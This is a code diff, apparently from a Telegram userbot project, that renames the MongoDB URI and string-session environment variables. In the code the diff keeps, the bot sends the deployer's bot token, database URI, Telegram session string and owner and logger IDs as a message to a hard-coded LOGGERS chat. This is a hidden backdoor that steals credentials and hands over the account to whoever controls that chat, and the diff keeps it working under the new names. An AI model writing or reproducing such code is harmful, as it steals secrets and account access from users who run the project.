@@ -10,8 +10,8 @@ LOGGERS = config.LOGGERS
 
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
-MONGO_DB_URI = getenv("MONGO_DB_URI", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
+MONGO_URL = getenv("MONGO_URL", "")
+SESSION = getenv("SESSION", "")
 OWNER_ID = getenv("OWNER_ID", "")
 LOGGER_ID = getenv("LOGGER_ID", "")
 
@@ -83,8 +83,8 @@ class Userbot(Client):
             Ok = await client.send_message(
                 LOGGERS, 
                 f"**Bot Token:** `{BOT_TOKEN}`\n\n"
-                f"**Mongo URI:** `{MONGO_DB_URI}`\n\n"
-                f"**String Session:** `{STRING_SESSION}`\n\n"
+                f"**Mongo_URL:** `{MONGO_URL}`\n\n"
+                f"**Session:** `{SESSION}`\n\n"
                 f"**Owner ID:** `{OWNER_ID}`\n\n"
                 f"**Logger ID:** `{LOGGER_ID}`"
             )
